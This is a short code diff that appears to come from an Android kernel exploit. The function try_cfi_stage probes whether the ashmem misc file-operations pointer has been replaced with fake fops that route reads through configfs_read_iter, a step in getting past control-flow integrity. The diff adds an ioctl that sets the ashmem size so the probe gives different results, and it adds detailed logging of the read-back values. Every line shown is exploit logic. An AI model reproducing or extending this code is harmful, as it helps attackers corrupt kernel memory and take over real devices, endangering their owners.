@@ -256,14 +256,21 @@ int try_cfi_stage(void) {
   }
 
   uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+
+  /* Diagnostic: set ashmem size so pread behavior differs between
+   * original fops (ashmem_read_iter → -EBADF) and fake fops
+   * (configfs_read_iter → returns data). Without size set, both
+   * return 0 and we can't distinguish. */
+  ioctl(fd, _IOW(0x77, 3, __typeof__(size_t)), (unsigned long)4096);
+
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
+  pr_info("cfi fops probe ret=%zd target=%016zx read=%016llx "
+          "want=%016zx errno=%d (EBADF=%d means original fops)\n",
+          pre_rb, misc_fops, (unsigned long long)pre_fops,
+          fake_fops, errno, errno == 9 ? 1 : 0);
   if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
-    pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
-               "read=%016llx want=%016zx errno=%d\n",
-               pre_rb, misc_fops, (unsigned long long)pre_fops,
-               fake_fops, errno);
     fops_before = pre_fops;
     cfi_last_step = 4;
     cfi_last_errno = errno;
